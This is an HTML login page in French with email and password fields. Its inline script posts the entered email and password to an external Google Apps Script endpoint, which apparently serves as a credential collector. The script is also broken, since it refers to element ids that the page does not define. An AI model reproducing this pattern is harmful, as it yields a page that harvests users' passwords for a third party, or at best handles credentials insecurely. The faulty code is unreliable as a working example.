<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="with=device-width,initial-scale=1.0">

    <link rel="stylesheet" href="style.CSS">
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
</head>

<body>

    <div class="wrapper">
        <form id="loginForm">
            <h1>Connexion</h1>
            <div class="input-box">
                <input type="email" placeholder="Email" required>
                <i class='bx bxs-envelope'></i>
            </div>
            <div class="input-box">
                <input type="password" placeholder="Mot de passe" required>
                <i class='bx bxs-lock-alt'></i>
            </div>

            <div class="Se souvenir de moi">
                <label><input type="checkbox"> Se souvenir de moi </label>
                <a href="reset-password.html">Mot de passe ?</a>
            </div>

            <button type="submit" class="btn">Connecter</button>
        </form>
    </div>
    
    <script src="script.js"></script> <!-- Inclure le script -->

 </section> 
 
 <script>
    document.getElementById('myForm').addEventListener('submit', function(e) {
        e.preventDefault(); // Empêche le formulaire de recharger la page
    
        // Récupérer les valeurs du formulaire
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;
    
        // Envoi des données vers Google Apps Script
        fetch('https://script.google.com/macros/s/AKfycby1kTbCsRAJYTvgj2bv0QI6Au9zii8mh39FKj4Nc5XQvu3y0oNNU9Tfo9-wihnLqbq5/exec', {
            method: 'POST',
            body: new URLSearchParams({
                'email': email,
                'password': password
            })
        })
        .then(response => response.json())
        .then(data => alert('Données envoyées avec succès !'))
        .catch(error => console.error('Erreur:', error));
    });
    </script>    

</body>
</html>
